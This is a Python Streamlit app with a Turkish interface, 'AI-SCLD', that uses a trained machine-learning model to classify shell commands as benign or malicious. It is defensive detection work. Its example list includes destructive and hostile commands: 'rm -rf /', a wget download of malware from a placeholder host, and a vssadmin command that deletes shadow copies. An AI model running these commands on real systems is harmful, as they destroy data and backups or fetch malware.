import streamlit as st
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
from predict import predict_command
import json

st.set_page_config(page_title="AI-SCLD", layout="wide", page_icon="🛡️")

st.title(" AI-SCLD: Gelişmiş Komut Satırı Güvenlik Analizi")

st.markdown("""
<div style='background-color: #f0f2f6; padding: 20px; border-radius: 10px; margin-bottom: 20px'>
<h4> Bu Araç Hakkında</h4>
Bu gelişmiş güvenlik aracı, girilen komutların zararlı mı yoksa güvenli mi olduğunu 
yapay zeka ile yüksek doğrulukta tahmin eder. <b>10,000 komut</b> üzerinde eğitilmiş 
<b>5 farklı makine öğrenmesi modeli</b> karşılaştırılarak en iyi performans elde edilmiştir.
</div>
""", unsafe_allow_html=True)


with st.sidebar:
    st.header("📊 Model Bilgileri")
    
    try:
        import joblib
        model = joblib.load('model.pkl')
        st.success(f"✅ Aktif Model: {model.__class__.__name__}")
        
       
        if st.button("📈 Veri Seti İstatistikleri"):
            try:
                df = pd.read_csv('dataset.csv')
                st.write(f"**Toplam Komut:** {len(df)}")
                st.write(f"**Güvenli:** {len(df[df['label'] == 'benign'])}")
                st.write(f"**Zararlı:** {len(df[df['label'] == 'malicious'])}")
                
               
                label_counts = df['label'].value_counts()
                fig = px.pie(values=label_counts.values, names=label_counts.index, 
                           title="Veri Seti Dağılımı")
                st.plotly_chart(fig, use_container_width=True)
            except:
                st.error("Veri seti yüklenemedi")
                
    except:
        st.error("❌ Model yüklenemedi")


col1, col2 = st.columns([2, 1])

with col1:
    st.subheader("🖊️ Komut Analizi")
    
    
    user_input = st.text_area(
        "Analiz edilecek komutu girin:", 
        height=100,
        placeholder="Örnek: ls -la /home/user"
    )
    
  
    st.subheader("💡 Örnek Komutlar")
    examples = [
        ("ls -la", "Güvenli"),
        ("rm -rf /", "Zararlı"),
        ("wget http://malicious.com/malware.exe", "Zararlı"),
        ("mkdir new_folder", "Güvenli"),
        ("vssadmin delete shadows /all /quiet", "Zararlı")
    ]
    
    example_cols = st.columns(len(examples))
    for i, (cmd, label) in enumerate(examples):
        color = "🟢" if label == "Güvenli" else "🔴"
        if example_cols[i].button(f"{color} {cmd}", key=f"example_{i}"):
            user_input = cmd
            st.rerun()

with col2:
    st.subheader("📊 Analiz Sonucu")
    result_placeholder = st.empty()


if st.button("🔍 KOMUT ANALİZ ET", type="primary", use_container_width=True):
    if user_input.strip() == "":
        st.warning("⚠️ Lütfen bir komut girin.")
    else:
        with st.spinner("Analiz yapılıyor..."):
            result = predict_command(user_input.strip())
            
           
            with result_placeholder.container():
                if result['prediction'] == 'error':
                    st.error(f"❌ Hata: {result['error']}")
                else:
                    
                    if result['prediction'] == 'malicious':
                        st.error(f"🚨 **ZARARLI KOMUT TESPİT EDİLDİ!**")
                        color = "red"
                        icon = "🚨"
                    else:
                        st.success(f"✅ **GÜVENLİ KOMUT**")
                        color = "green"
                        icon = "✅"
                    
                    
                    metric_col1, metric_col2, metric_col3 = st.columns(3)
                    metric_col1.metric("Tahmin", result['prediction'].upper())
                    metric_col2.metric("Güven Oranı", f"%{result['confidence']}")
                    metric_col3.metric("Risk Seviyesi", result['risk_level'])
                    
                    
                    fig = go.Figure(go.Indicator(
                        mode = "gauge+number",
                        value = result['confidence'],
                        domain = {'x': [0, 1], 'y': [0, 1]},
                        title = {'text': "Güven Oranı (%)"},
                        gauge = {
                            'axis': {'range': [None, 100]},
                            'bar': {'color': color},
                            'steps': [
                                {'range': [0, 50], 'color': "lightgray"},
                                {'range': [50, 80], 'color': "yellow"},
                                {'range': [80, 100], 'color': "lightgreen"}],
                            'threshold': {
                                'line': {'color': "red", 'width': 4},
                                'thickness': 0.75, 'value': 90}}))
                    fig.update_layout(height=300)
                    st.plotly_chart(fig, use_container_width=True)
                    
                    
                    st.subheader("📄 Detaylı Sonuç (JSON)")
                    st.json(result)
                    
                   
                    if st.button("💾 Sonucu Kaydet"):
                        with open('prediction_result.json', 'w') as f:
                            json.dump(result, f, indent=2)
                        st.success("Sonuç prediction_result.json dosyasına kaydedildi!")


st.markdown("---")
st.markdown("""
<div style='text-align: center; color: #666'>
<small>
🔒 <b>AI-SCLD v2.0</b> | C-Prot Inc. | Gelişmiş Makine Öğrenmesi ile Güvenlik Analizi<br>
Model Türleri: Logistic Regression, Random Forest, SVM, Gradient Boosting, Naive Bayes
</small>
</div>
""", unsafe_allow_html=True)